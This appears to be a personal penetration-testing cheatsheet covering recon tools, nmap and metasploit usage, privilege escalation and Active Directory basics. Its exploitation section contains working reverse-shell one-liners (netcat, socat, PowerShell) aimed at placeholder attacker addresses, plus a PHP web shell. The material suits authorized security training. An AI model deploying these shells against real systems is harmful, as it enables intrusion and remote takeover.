# Red Team Cheatsheet

[Tib3rius Pentest Cheatsheets](https://github.com/Tib3rius/Pentest-Cheatsheets)
## 1. OSINT / Reconnaissance
*Reconnaissance* is all about info gathering and can usually be done without directly interacting with the target(s) or any of their systems.

### Tools
- General Search
    - [Google](https://www.google.com) / [Google Dorking](https://exposingtheinvisible.org/guides/google-dorking/)
    - [Bing](https://www.bing.com)
    - [DuckDuckGo](https://www.duckduckgo.com)
    - [Internet Archive](https://archive.org/)
    - [Yandex](https://yandex.ru)
    - [Wikipedia](https://www.wikipedia.com)
- [PeopleFinder.com](https://www.PeopleFinder.com): person lookup, police records, background checks, social media etc.
- Domain / Subdomains
    - [who.is](https://who.is): domain name search
    - [threatcrowd](https://threatcrowd.org/)
    - [AbusedIPDB](https://www.abuseipdb.com/)
    - [Talos Reputation Center](https://talosintelligence.com/reputation_center/lookup)
    - [dnsdumpster](https://dnsdumpster.com/): dns recon & research
    - [sublist3r](https://tools.kali.org/information-gathering/sublist3r): subdomain enumuration with OSINT
- Images / Pictures
    - [TinEye](https://tineye.com/): reverse image search
    - [exiftool](https://exiftool.org/): image metadata extractor 
- Email / Social Media
    - [hunter.io](https://hunter.io/): email search
    - [Namechk](https://namechk.com/): social media username lookup
    - [Lookup ID](https://lookup-id.com/): Facebook profile lookup
- Web
    - [wigle.net](https://wigle.net): catalog of wireless networks
    - [Shodan](https://www.shodan.io/): open internet device search
    - [builtwith.io](https://builtwith.com/): website stack profiler
    - [Wappalyzer](https://www.wappalyzer.com/): website stack profiler
- Knowledge Organization
    - [Maltego](https://www.maltego.com/): graphical link analysis tool for gathering and connecting information
- Maps / GPS / Location
    - [Google Maps](https://maps.google.com/)
    - [Map Customizer](https://www.mapcustomizer.com/)
    
## 2. Enumeration / Scanning
*Enumeration* is necessary to map out the overall *attack surface* of the target(s).

### Tools
- [nmap](https://nmap.org/)
    ```bash
    # Scan Types 
    nmap -sn <host> # Ping scan (disables port scan)
    nmap -Ap <host> # Agressive, enables OS and version detection,
                                    # script scanning, and traceroute across all ports
    nmap -sT <host> # TCP scan
    nmap -sU <host> # UDP scan
    nmap -sN <host> # NULL scan
    nmap -sF <host> # FIN scan
    nmap -sX <host> # Xmas scan
    nmap -sS <host> # SYN scan
    nmap --script=vuln <host> # enumerate host for known vulnerabilities
    nmap -PN <host> # skip initial ping check to scan hosts that ignore ping
    nmap -v -sV -sC -oN nmap <host> # standard scan top 10000
    nmap -v -sV -sC -oN nmapAll <host> -p- # standard scan all ports
    ```
    - [NSE (Nmap Scripting Engine)](https://nmap.org/book/man-nse.html)
	- Don't forget to lookup `nmap` script, there are many available for finding vulns and enumerating a host for many services	
- [dirb](https://tools.kali.org/web-applications/dirb): enum web directories/files
- [dirbuster](https://tools.kali.org/web-applications/dirbuster): enum web directories/files
- [dnsrecon](https://pentestlab.blog/2012/11/13/dns-reconnaissance-dnsrecon/)
- [gobuster](https://github.com/OJ/gobuster): enum web directories/files
- [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
- [metasploit](https://www.metasploit.com/): DB of easily searchable and configurable exploits
- [Burpe Suite](https://www.metasploit.com/): capture and mod HTTP requests
- [ZAP](https://www.zaproxy.org/getting-started/): capture HTTP requests, web fuzzing
- [grep.app](https://grep.app/): search Github for api keys, passwords etc.
- [smbmap](https://tools.kali.org/information-gathering/smbmap): enumerate smb shares
- [smbclient](https://linux.die.net/man/1/smbclient)
- [smbtree](https://linux.die.net/man/1/smbtree)
- [wfuzz](https://wfuzz.readthedocs.io/en/latest/): web app bruteforcer
- [ffuf (Fuzz Faster U Fool)](https://github.com/ffuf/ffuf): a fast web fuzzer written in Go
- [AutoRecon](https://github.com/Tib3rius/AutoRecon): network recon tool which performs automated enumeration of services 

### Tips/Tricks
- Websites / Webservers
    - Enumerate web directories/files with a tool like gobuster
    - when enumerating a website, if you find hidden directories not picked up on the first pass of gobuster/dirbuster, don't forget to rerun them with the new base directory

## 3. Exploitation / Gaining Access
Never jump to the *exploitation* phase too early. You __must__ perform adequate *reconnaissance* and *enumeration*.

### Tools
- Reverse / Bind Shells Payloads
    - [netcat](https://nmap.org/ncat/guide/index.html): network Swiss Army knife
    - [Socat](https://linux.die.net/man/1/socat): bidirectional byte stream handler, useful for more stable reverse & bind shells
    - [Reverse Shell Generator](https://www.revshells.com/)
    - [pentestmonkey](http://pentestmonkey.net/)
    - [msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
    - [ASMI.fail](https://amsi.fail/): obfuscated powershell snippets. ASMI = Anti-Malware Scan Interface
    - [ScareCrow](https://github.com/optiv/ScareCrow): payload creation framework designed for EDR bypass
    - [searchsploit](https://www.exploit-db.com/searchsploit): searches [exploit.db](https://exploit.db)
    - [Metasploit](https://docs.rapid7.com/metasploit/)
        ----
        ```msfconsole
        # Search metasploit's db for exploits
        search <keyword>
        
        # Get context-specific variable
        get <var>
        
        # Set global variable
        setg <var>
        
        # Unset context-specific variable
        unset <var>
        
        # store nmap scan in database
        db_nmap <options> <host>
        
        # list open services on target
        services
        
        # list host info in database
        hosts
        
        # list vulns
        vulns

        # edit exploit source code
        edit
        ```
        ```meterpreter (windows)
        # migrate to another process
        migrate <PID>
        
        # check if target is a VM
        run post/windows/gather/checkvm
        
        # setup msfvenom reverse shell payload listener
        # don't forget to set LHOST and LPORT	
        use exploit/multi/handler
        
        # setup windows meterpreter reverse shell
        set payload windows/meterpreter/reverse_tcp
        run
        ```
- Automated Scanners
    - [sqlmap](https://sqlmap.org/)
    - [Nishang](https://github.com/samratashok/nishang)
    - [nikto](https://securitytrails.com/blog/nikto-website-vulnerability-scanner): web server vuln scanner
        - may need to look at `-Help` not all info in man pages
        - use `-until` to set scan duration
            ```bash
            # default scan
            nikto -h <url> -p <port> -output <file.txt>
            ```
- Phishing
    - [Gophish](https://getgophish.com/): 
- [impacket](https://github.com/SecureAuthCorp/impacket)
    

### Exploit/CVE Research
- [Mitre CVE](https://cve.mitre.org/)
- [CVE Details](https://www.cvedetails.com/)
- [NVD](https://nvd.nist.gov/vuln/search)
- [Exploit Database](https://www.exploit-db.com/)
----

### [Web Exploitation](web.md)

### Network Services
#### Telnet
#### SMB (Server Message Blocks)
- `enum4linux-ng`, `smclient`
#### FTP
- `ftp`
    - If you ever download file via FTP, may need to use the `binary` command, which sets the transfer type and supports binary images.
#### [Kerberos](https://docstore.mik.ua/orelly/networking_2ndEd/fire/ch21_05.htm)
#### NFS
- `showmount` - shows mount info for an NFS server
- mount the NFS share with `sudo mount -t nfs <IP>:<SHARE> /mount/location`
#### SMTP
- enumerate with nmap script or metasploit (auxiliary/scanner/smtp/smtp-enum)
#### MySQL
- enumerate with nmap script or metasploit (auxiliary/scanner/mysql)

### Tips/Tricks
- Use `python -c 'import pty;pty.spawn("/bin/bash")'` to run a bash shell

#### Shells
- Get stable bind or reverse shell
    1. Python 
        ```bash
        python -c 'import pty;pty.spawn("/bin/bash")' # spawn bash shell
        export TERM=xterm # get access to term command like `clear`
        stty raw -echo; fg # turns off terminal echo (so we get tab autocomplete, arrow keys, and Ctrl + C) 
        # NOTE if the shell dies, we won't get any terminal echo since we disabled it
        # type `reset` to fix that
        ```
    2. rlwrap: gives access to history, tab completion, and arrow keys. Particularly useful for Windows shells.
        ```bash
        rlwrap nc -lvnp <port>
        stty raw -echo; fg # to completely stabilise
        ```
    3. Socat
        - initial access with `nc`. Download socat static compiled binary.
        - Reverse shells
            - Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
                - The _pipes_ options is used to force powershell or cmd.exe to use Unix style STDIO
            - Linux: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash-li"`
        - Bind shells
            - Windows: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
            - Linux: `socat TCP-L:<PORT> EXEC:"bash -li"`
        - connect to listener: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
        - Stable linux reverse shell with tty
            ```bash
            # listener
            socat TCP-L:<port> FILE:`tty`,raw,echo=0
            # connect to listener
            socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
            ```
        - Socat encrypted shell
            ```bash
            # generate cert for encrypted shell
            openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
            # merge key and cert into .pem
            cat shell.key shell.crt > shell.pem

            # reverse shell setup listener
            socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - 
            # NOTE: the cert MUST be used on the listening device
            # connect back to listener 
            socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

            # bind shell setup listener
            socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
            # connect back to listener
            socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
            ```
        - Common shell payloads
            ```bash
            # Linux listener for bind shell
            mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
            # Linux reverse shell
            mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
            ```
            ```powershell
            # Powershell reverse shell oneliner
            powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            ```
- Web Shells
    - PHP
        ```php
        <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
        ```
- Configure terminal tty size to use a text editor
    ```bash
    stty -a # list tty settings
    stty rows <number> # set to row output from stty -a
    stty cols <number> # set to col output from stty -a
    ```
- See `/usr/share/webshells` for webshells available on default Kali
- [evil-winrm](https://github.com/Hackplayers/evil-winrm)
- [Poison null byte](https://defendtheweb.net/article/common-php-attacks-poison-null-byte)


## 4. Privilege Escalation (Priv Esc)
### Tools
- Vuln Enum
	- [PEASS-ng](https://github.com/carlospolop/PEASS-ng): Privilege Escalation Awesome Scripts SUITE
	- [LinEnum](https://githeub.com/rebootuser/LinEnum)
	- [LSE (Linux Smart Enumeration)](https://github.com/diego-treitos/linux-smart-enumeration)
	- [pspy](https://github.com/DominicBreuker/pspy/): monitor processes w/o root permissions
	- [Seatbelt](https://github.com/GhostPack/Seatbelt): C# project that performs "safety checks" on a Windows host
- Brute Forcing
- Escalation
	- [gtfobins](https://gtfobins.github.io/)

### Passwords / Cracking Hashes
- [Hydra](https://en.kali.tools/?p=220)
- [John the Ripper](https://openwall.info/wiki/john)
    ```bash
    # crack hashes and show results
    john --format=<format> --show hashes.txt 
    ```
- [hashcat](https://hashcat.net/hashcat/)
- [crackstation.com](https://crackstation.net/)
- [hashes.com](https://hashes.com/en/decrypt/hash)
- [unshadow](https://www.commandlinux.com/man-page/man8/unshadow.8.html)
- [CrackMapExec](https://ptestmethod.readthedocs.io/en/latest/cme.html)
- [gosecretdump](https://github.com/C-Sto/gosecretsdump)
- [Hashes.com](https://hashes.com/en/tools/hash_identifier)
- [hash-identifier](https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master)
- [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)

### Windows
- `whoami /priv`: list all privileges
- `C:\Windows\Tesmp`: world writeable temp directory
- `C:\Program Files (x86)\SystemScheduler\Events`: windows scheduled services event logs
- `C:\Windows\System32\drivers\etc\hosts`: /etc/hosts for Windows
- CMD
	`sc query`: lists running services
	`wevtutil`: retrieve info about event logs and publishers
### Linux
1. Storage
    - Store enum script in `/tmp` or 
1. Service/Process Exploitation
    - mysql running as root
1. Weak File Permissions
    - readable /etc/shadow
    - `find / -type f -user www-data 2>/dev/null`: find all files accessible by user www-data
1. Sudo
    - `sudo -l`: list sudo permissions for "user"
    - Shell Escape Sequences
    - Environment Variables
1. SUID / SGID Executables
    - `find / -type f -perm -u+s 2>/dev/null`: find all suid files
    - `find / -type f -perm -g+s 2>/dev/null`: find all guid files
    - known exploits (exploit-db / searchsploit)
    - shared object injection
    - environment variables
    - abusing shell features
1. Cron Jobs
    - File Permissions
    - PATH Environment Variable: you can plant a script if the you can write to a directory in the path, and the cronjob doesn't specify a full path
    - Wildcards: check for `*` wildcards used in cronjobs
1. Passwords & Keys
    - history files
    - config files
    - ssh keys
1. NFS
	- `/etc/exports`: NFS config check for _root_squashing_
1. Kernel Exploits
1. Priv Esc Scripts
1. [Restricted Shells](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
1. [Write your own shell code](https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/)

## 5. Post Exploitation



## 6. Pivoting / Proxies
### Tools
- [SSH Tunnels & Procies](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6?gi=a1c24efda869)
- [Proxychains](https://github.com/haad/proxychains)
- [sshuttle](https://sshuttle.readthedocs.io/en/stable/)

## 7. Covering Tracks / Cleanup
Rules of any engagment should be agreed to prior to the penetration test.
Take exhaustive notes to assist IT/system owner in cleanup and remediation.

### Tools
- [LOLBAS (Living Off the Land Binaries And Scripts)](https://lolbas-project.github.io/#)

## 8. Reporting
Provide a *full format report* along with a breakdown including *remediation recommendations*.

### Templates
- [OSCP Exam Report Markdown](https://github.com/noraj/OSCP-Exam-Report-Template-Markdown)

----
# Linux

# Windows
## [NTLM Relay](https://en.hackndo.com/ntlm-relay/)
## Active Directory (AD)
*Active Directory* (AD) is the directory service for Windows Domain Networks. AD allows for control and monitoring of all a companies users through a single *domain controller*. It allows a single user to sign into any computer on the AD network.

- Domain Controller: holds the `AD DS data store` and allows admin access to domain resources.
- AD DS (Domain Services) Data Store
	- `NTDS.dit`: a database of all the AD domain controller info such as password hashes for domain users. By default the `NTDS.dit` is stored in `%SystemRoot%\NTDS` and only accessible by the domain controller.
- Forests, Trees, Domains
	- Forest: a collection of one or more domain trees in an AD network
		- Trees - A hierarchy of domains in Active Directory Domain Services
		- Domains - Used to group and manage objects 
		- Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
		- Trusts - Allows users to access resources in other domains
		- Objects - users, groups, printers, computers, shares
		- Domain Services - DNS Server, LLMNR, IPv6
		- Domain Schema - Rules for object creation
- Users
	- Domain Admins: the big boss, only ones with access to the domain controller.
	- Service Accounts (can also be Domain Admins) these mostly aren't used except for service maintenance.
	- Local Admins: these users can make changes on local machines as admin but __cannot__ access the domain controller.
	- Domain users: everyday users, may have local admin to machines to machinens they have access to. 
- Groups
	- Security Groups: these groups can specify permissions for many users
	- Default Security Groups
		- Domain Controllers: all domain controllers in the domain
		- Domain Guests: all domain guests
		- Domain User: all domain users
		- Domain Computers: all workstations and servers joined to the domain
		- Domain Admins: designated admins of the domain
		- Enterprise Admins: designated admins of the enterprise
		- Schema Admins: designated admins of the schema
		- DNS Admins: 
		- DNS Update Proxy: DNS clients who are permitted to perform dynamic updates on behalf of some othe rclients (such as DHCP servers)
		- Allowed RODC Password Replication Group: members can have their passwords replicated to all read-only domain ccontrollers in the domain
		- Group Policy Creator Owners: members can modify group policy for the domain
		- Denied RODC Password Replication Group: members cannot have their passwords replicated to any read-only domain controllers in the domain
		- Protected users: members are affored additional protections against authentication security threats.
		- Cert Publishers: members are permitted to publish certificates to the directory
		- Enterprise Read-Only Domain Controllers: members ccan perform admin actions on key objects within the forest
		- Cloneable Domain Controllers: members that are domain controllers can be cloned
		- RAS and IAS Servers: servers in this group can access remote access properties of users
	- Distribution Groups: these groups can specify email distribution lists.
- Trusts: a mechanism for users in the network to gain acccess to other resources in the domain. Mostly truts outline the way domains inside a forest communicate with each other.
	- Directional Trusts: the direction of the trust flows from a *trusting* domain to a *trusted* domain
	- Transitive: the trust relationship expands beyond just two domains to include to include other trusted domains	
- Policies: dictate how the server operates and what rules it will or won't follow. These rules apply to the entire domain.
- Domain Services + Auth
    - *Domain Services* are just services the domain controller provides to the rest of the domain or tree.
    - Default Domain Services
		- LDAP (Lightweigth Directory Access Protocol): provides communication between applications and directory services
		- Certificate Services: allows the domain controller to create, validate and revoke public key certificates
		- DNS, LLMNR, NBT-NS: domain name services for identifying IP hostnames
	- Authentication: The most important and vulnerable part of AD. Two type: NTLM and Kerberos. 
		- NTLM: default Windows auth protocol uses an encrypted challenge/response
		- Kerberos: default auth service for AD, uses ticket-granting tickets and service tickets to authenticate users
- Azure (AD in the Cloud)

	Windows Server AD|Azure AD
	|---|---
	|LDAP|Rest APIs
	|NTLM|OAuth/SAML
	|Kerberos|OpenID
	|OU Tree|Flat Structure
	|Domains and Forests|Tenants
	|Trusts|Guests


## Auth / LSASS.exe
- [Access Tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
	- Primary Access Tokens: token associated with a user account generated at log on
	- Impersonation Tokens: token that allows a particular process (or thread) to gain access to resources using the token of another user/client process. These tokens have levels.
		1. SecurityAnonymous: current user/client can't impersonate another user/client
		2. SecurityIdentification: current user/cclient can get the ID and privileges of a client, but cannot impersonate the client
		3. SecurityImpersonation: current user/client can impersonate the client's security context on the local system
		4. SecurityDelegation: current user/client can impersonate the client's security context on a remote system
	- user SIDs (security identifier)
	- group SIDs
	- privileges


## Kali
- Windows binaries in `/usr/share/windows-resources/binaries`

